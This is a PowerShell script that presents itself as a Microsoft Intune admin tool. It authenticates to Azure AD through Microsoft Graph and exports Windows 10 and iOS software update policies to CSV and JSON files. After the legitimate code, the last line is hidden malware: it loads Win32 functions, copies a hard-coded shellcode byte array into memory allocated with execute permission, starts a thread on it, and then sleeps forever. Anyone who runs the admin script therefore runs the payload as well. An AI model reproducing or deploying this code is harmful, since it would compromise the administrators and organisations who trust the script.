




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-SoftwareUpdatePolicy(){



[cmdletbinding()]

param
(
    [switch]$Windows10,
    [switch]$iOS
)

$graphApiVersion = "Beta"

    try {

        $Count_Params = 0

        if($iOS.IsPresent){ $Count_Params++ }
        if($Windows10.IsPresent){ $Count_Params++ }

        if($Count_Params -gt 1){

        write-host "Multiple parameters set, specify a single parameter -iOS or -Windows10 against the function" -f Red

        }

        elseif($Count_Params -eq 0){

        Write-Host "Parameter -iOS or -Windows10 required against the function..." -ForegroundColor Red
        Write-Host
        break

        }

        elseif($Windows10){

        $Resource = "deviceManagement/deviceConfigurations?`$filter=isof('microsoft.graph.windowsUpdateForBusinessConfiguration')&`$expand=groupAssignments"

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).value

        }

        elseif($iOS){

        $Resource = "deviceManagement/deviceConfigurations?`$filter=isof('microsoft.graph.iosUpdateConfiguration')&`$expand=groupAssignments"

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Export-JSONData(){



param (

$JSON,
$ExportPath

)

    try {

        if($JSON -eq "" -or $JSON -eq $null){

        write-host "No JSON specified, please specify valid JSON..." -f Red

        }

        elseif(!$ExportPath){

        write-host "No export path parameter set, please provide a path to export the file" -f Red

        }

        elseif(!(Test-Path $ExportPath)){

        write-host "$ExportPath doesn't exist, can't export JSON Data" -f Red

        }

        else {

        $JSON1 = ConvertTo-Json $JSON

        $JSON_Convert = $JSON1 | ConvertFrom-Json

        $displayName = $JSON_Convert.displayName

        
        $DisplayName = $DisplayName -replace '\<|\>|:|"|/|\\|\||\?|\*', "_"

        $Properties = ($JSON_Convert | Get-Member | ? { $_.MemberType -eq "NoteProperty" }).Name

            $FileName_CSV = "$DisplayName" + "_" + $(get-date -f dd-MM-yyyy-H-mm-ss) + ".csv"
            $FileName_JSON = "$DisplayName" + "_" + $(get-date -f dd-MM-yyyy-H-mm-ss) + ".json"

            $Object = New-Object System.Object

                foreach($Property in $Properties){

                $Object | Add-Member -MemberType NoteProperty -Name $Property -Value $JSON_Convert.$Property

                }

            write-host "Export Path:" "$ExportPath"

            $Object | Export-Csv -LiteralPath "$ExportPath\$FileName_CSV" -Delimiter "," -NoTypeInformation -Append
            $JSON1 | Set-Content -LiteralPath "$ExportPath\$FileName_JSON"
            write-host "CSV created in $ExportPath\$FileName_CSV..." -f cyan
            write-host "JSON created in $ExportPath\$FileName_JSON..." -f cyan
            
        }

    }

    catch {

    $_.Exception

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$ExportPath = Read-Host -Prompt "Please specify a path to export the policy data to e.g. C:\IntuneOutput"

    
    $ExportPath = $ExportPath.replace('"','')

    if(!(Test-Path "$ExportPath")){

    Write-Host
    Write-Host "Path '$ExportPath' doesn't exist, do you want to create this directory? Y or N?" -ForegroundColor Yellow

    $Confirm = read-host

        if($Confirm -eq "y" -or $Confirm -eq "Y"){

        new-item -ItemType Directory -Path "$ExportPath" | Out-Null
        Write-Host

        }

        else {

        Write-Host "Creation of directory path was cancelled..." -ForegroundColor Red
        Write-Host
        break

        }

    }



$WSUPs = Get-SoftwareUpdatePolicy -Windows10

if($WSUPs){

    foreach($WSUP in $WSUPs){

        write-host "Software Update Policy:"$WSUP.displayName -f Yellow
        Export-JSONData -JSON $WSUP -ExportPath "$ExportPath"
        Write-Host

    }

}

else {

    Write-Host "No Software Update Policies for Windows 10 Created..." -ForegroundColor Red
    Write-Host

}



$ISUPs = Get-SoftwareUpdatePolicy -iOS

if($WSUPs){

    foreach($ISUP in $ISUPs){

        write-host "Software Update Policy:"$ISUP.displayName -f Yellow
        Export-JSONData -JSON $ISUP -ExportPath "$ExportPath"
        Write-Host

    }

}

else {

    Write-Host "No Software Update Policies for iOS Created..." -ForegroundColor Red
    Write-Host

}


$YQgc = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $YQgc -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0xff,0x87,0x7d,0x22,0xd9,0xc0,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x5a,0x31,0x6b,0x14,0x83,0xeb,0xfc,0x03,0x6b,0x10,0x1d,0x72,0x81,0xca,0x63,0x7d,0x7a,0x0b,0x03,0xf7,0x9f,0x3a,0x03,0x63,0xeb,0x6d,0xb3,0xe7,0xb9,0x81,0x38,0xa5,0x29,0x11,0x4c,0x62,0x5d,0x92,0xfa,0x54,0x50,0x23,0x56,0xa4,0xf3,0xa7,0xa4,0xf9,0xd3,0x96,0x67,0x0c,0x15,0xde,0x95,0xfd,0x47,0xb7,0xd2,0x50,0x78,0xbc,0xae,0x68,0xf3,0x8e,0x3f,0xe9,0xe0,0x47,0x3e,0xd8,0xb6,0xdc,0x19,0xfa,0x39,0x30,0x12,0xb3,0x21,0x55,0x1e,0x0d,0xd9,0xad,0xd5,0x8c,0x0b,0xfc,0x16,0x22,0x72,0x30,0xe5,0x3a,0xb2,0xf7,0x15,0x49,0xca,0x0b,0xa8,0x4a,0x09,0x71,0x76,0xde,0x8a,0xd1,0xfd,0x78,0x77,0xe3,0xd2,0x1f,0xfc,0xef,0x9f,0x54,0x5a,0xec,0x1e,0xb8,0xd0,0x08,0xab,0x3f,0x37,0x99,0xef,0x1b,0x93,0xc1,0xb4,0x02,0x82,0xaf,0x1b,0x3a,0xd4,0x0f,0xc4,0x9e,0x9e,0xa2,0x11,0x93,0xfc,0xaa,0x8b,0xc9,0x8a,0x2a,0x3b,0x65,0x1a,0x45,0xd2,0xdd,0xb4,0xd5,0x53,0xf8,0x43,0x19,0x4e,0x35,0x97,0xb6,0x23,0x65,0x74,0x6a,0xab,0xb3,0x2c,0xf5,0x8c,0x3b,0x05,0x56,0x81,0xa9,0xa5,0x0a,0x76,0x46,0x46,0xb0,0x78,0x96,0x7e,0x45,0x78,0x96,0x7e,0x79,0x4a,0xae,0x4c,0xfc,0xed,0xce,0xe0,0x96,0xa6,0x47,0x9f,0xa1,0xb7,0x8d,0x29,0xeb,0x14,0x46,0x2a,0xc6,0x7a,0x12,0x79,0x75,0x29,0x4c,0x2d,0x2f,0xa5,0x99,0x84,0xe1,0x0e,0xa1,0xf2,0x68,0x1a,0x57,0xa2,0xfc,0x5a,0x54,0x5c,0xfd,0xd3,0x7b,0x36,0xf9,0xb3,0x11,0xd8,0x57,0x5b,0x93,0xa0,0xc9,0x1d,0xa4,0xf8,0xa5,0x72,0x08,0x50,0x1c,0x1c,0x83,0x50,0xb8,0xa7,0x24,0x89,0x3d,0x97,0xae,0x38,0x71,0x62,0x88,0x55,0x7d,0x39,0x88,0xf0,0x82,0x94,0xa7,0xbc,0x14,0x16,0x28,0x3d,0xe5,0x7e,0x48,0x3d,0xa5,0x7e,0x1b,0x55,0x7d,0xda,0xc8,0x40,0x82,0xf7,0x7c,0xd9,0x2e,0x7e,0x65,0x89,0xb8,0x80,0x4a,0x36,0x39,0xd3,0xdc,0x5e,0x2b,0x45,0x69,0x7c,0xb4,0xbc,0xef,0x41,0x3f,0xf3,0x7b,0x46,0xc1,0xc8,0xf9,0x89,0xb4,0x2b,0x59,0xc9,0x68,0x5b,0x2f,0x32,0x69,0x64,0xa7,0xbb,0xe1,0xb4,0x3b,0x21,0x7c,0xbe,0xd2,0xca,0xe5,0x10,0x46,0x65,0x94,0x03,0xe5,0x10,0x75,0xae,0x85,0xf4,0xe1,0x31,0x12,0x6c,0xea;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$uRm5=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($uRm5.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$uRm5,0,0,0);for (;;){Start-sleep 60};

